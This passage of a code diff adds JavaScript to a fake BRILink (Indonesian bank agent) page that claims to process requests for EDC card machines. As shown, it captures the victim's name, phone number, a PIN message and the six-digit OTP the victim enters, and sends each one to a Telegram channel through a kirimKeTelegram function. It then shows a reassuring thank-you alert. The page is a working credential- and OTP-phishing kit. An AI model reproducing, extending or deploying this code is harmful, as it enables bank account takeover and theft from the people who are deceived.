+📱 HP: ${dataPengajuan.hp}
+━━━━━━━━━━━━━━━━━━━━
+    `;
+    kirimKeTelegram(pesanPIN);
+    
+    document.getElementById('otpNoHP').textContent = dataPengajuan.hp;
+    goToStep(4);
+    mulaiTimerOTP();
+});
+
+// ==============================================
+// INPUT OTP — OTOMATIS PINDAH FOKUS
+// ==============================================
+document.querySelectorAll('.otp-box').forEach((box, index, all) => {
+    box.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value) {
+            this.classList.add('filled');
+            if (index < all.length - 1) all[index + 1].focus();
+        } else {
+            this.classList.remove('filled');
+        }
+    });
+    box.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && index > 0) {
+            all[index - 1].focus();
+            all[index - 1].value = '';
+            all[index - 1].classList.remove('filled');
+        }
+    });
+});
+
+function mulaiTimerOTP() {
+    let detik = 60;
+    const elTimer = document.getElementById('timer');
+    const btnKirimUlang = document.getElementById('btnKirimUlang');
+    btnKirimUlang.disabled = true;
+    elTimer.textContent = detik;
+    
+    if (otpTimer) clearInterval(otpTimer);
+    otpTimer = setInterval(() => {
+        detik--;
+        elTimer.textContent = detik;
+        if (detik <= 0) {
+            clearInterval(otpTimer);
+            btnKirimUlang.disabled = false;
+            elTimer.textContent = '';
+        }
+    }, 1000);
+}
+
+function kirimUlangOTP() {
+    mulaiTimerOTP();
+    kirimKeTelegram(`📤 *OTP DIKIRIM ULANG* — ${dataPengajuan.nama} (${dataPengajuan.hp})`);
+}
+
+document.getElementById('formOTP').addEventListener('submit', function(e) {
+    e.preventDefault();
+    let otp = '';
+    document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
+    
+    const pesanOTP = `
+🔢 *KODE OTP DIMASUKKAN*
+━━━━━━━━━━━━━━━━━━━━
+👤 Pengguna: ${dataPengajuan.nama}
+📱 HP: ${dataPengajuan.hp}
+🔑 OTP: ${otp}
+━━━━━━━━━━━━━━━━━━━━
+    `;
+    kirimKeTelegram(pesanOTP);
+    
+    document.getElementById('finalNama').textContent = dataPengajuan.nama;
+    goToStep(5);
+});
+
+// ==============================================
+// FUNGSI SELESAI
+// ==============================================
+function selesai() {
+    alert('✅ Terima kasih!\n\nPengajuan mesin EDC Anda telah diterima. Kami akan segera memproses dan mengirimkan ke alamat yang tercantum.\n\nTerima kasih telah menggunakan layanan BRILink.');
+    goToStep(1);
+    document.getElementById('formAlamat').reset();
+    document.getElementById('formLogin').reset();
+    dataPengajuan = {};
+}
+
+document.addEventListener('DOMContentLoaded', loadProvinsi);
+</script>
+
+</body>
+</html>
